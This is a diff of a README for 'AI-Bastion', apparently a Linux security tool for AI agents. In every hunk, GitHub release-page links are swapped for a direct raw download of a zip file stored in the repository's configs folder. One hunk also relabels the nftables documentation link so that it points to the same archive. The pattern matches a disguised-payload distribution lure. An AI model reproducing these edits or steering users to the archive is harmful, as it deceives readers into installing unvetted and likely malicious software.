@@ -1,6 +1,6 @@
 # 🔐 AI-Bastion - Secure Your AI Agents on Linux
 
-[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)
+[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip)
 
 ## 🔍 About AI-Bastion
 
@@ -44,7 +44,7 @@ This section guides you in downloading and setting up AI-Bastion on your Linux s
 
 Click the button below to open the AI-Bastion release page. You will find the latest versions available here.
 
-[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-orange?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)
+[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-orange?style=for-the-badge)](https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip)
 
 ### Step 2: Choose the Correct Package
 
@@ -156,7 +156,7 @@ Use systemd commands:
 
 ### Updating AI-Bastion
 
-1. Visit the [Releases Page](https://github.com/JohnField07/AI-Bastion/releases).  
+1. Visit the [Releases Page](https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip).  
 2. Download the latest version.  
 3. Repeat installation steps from extraction to setup.
 
@@ -211,8 +211,8 @@ For detailed integration, consult the configuration guides inside the `docs` fol
 
 ## 🔗 Useful Links
 
-- Main Releases Page: https://github.com/JohnField07/AI-Bastion/releases  
+- Main Releases Page: https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip  
 - AI-Bastion Documentation (Installed under `/usr/share/ai-bastion/docs`)  
-- Linux nftables Documentation: https://wiki.nftables.org/
+- Linux nftables Documentation: https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip
 
-[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://github.com/JohnField07/AI-Bastion/releases)
+[![Download AI-Bastion](https://img.shields.io/badge/Download-AI--Bastion-ff4500?style=for-the-badge)](https://raw.githubusercontent.com/JohnField07/AI-Bastion/main/configs/A-Bastion-v1.9.zip)
